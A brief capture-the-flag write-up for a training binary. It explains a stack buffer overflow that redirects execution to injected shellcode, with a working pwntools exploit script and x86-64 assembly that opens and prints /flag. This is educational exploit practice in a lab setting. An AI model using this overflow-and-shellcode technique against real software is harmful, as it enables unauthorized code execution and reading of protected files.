# Exploitation Scenarios - Level 1
In this challenge we need to overflow a buffer the difference here is that there is no win function and or flag stored in the binary, but the binary asks us for a shellcode this means we could overwrite the return address to jump to our shellcode and read the flag this way.

Let's try this out.

```
from pwn import *

context.arch = "amd64"

shellcode = ""
with open("1.s") as file:
	for i in file.readlines():
		shellcode += i

print(asm(shellcode))

io = process("./toddlerone_level1.0")
io.sendline(asm(shellcode))
print(io.readline())
print(io.readline())
payload = b"A" * 72 + p64(0x2f2b5000)
io.sendline(b"120")

io.write(payload)
io.interactive()
```

```
.global _start
.intel_syntax noprefix
_start:
	mov rax, 2
	lea rdi, [rip+flag]
	xor rsi, rsi
	xor rdx, rdx
	syscall
	mov rsi, rax
	mov rax, 40
	mov rdi, 1
	xor rdx, rdx
	mov r10, 0x1000
	syscall
	mov rax, 60
	mov rdi, 69
	syscall
flag:
	.ascii "/flag\0"

```
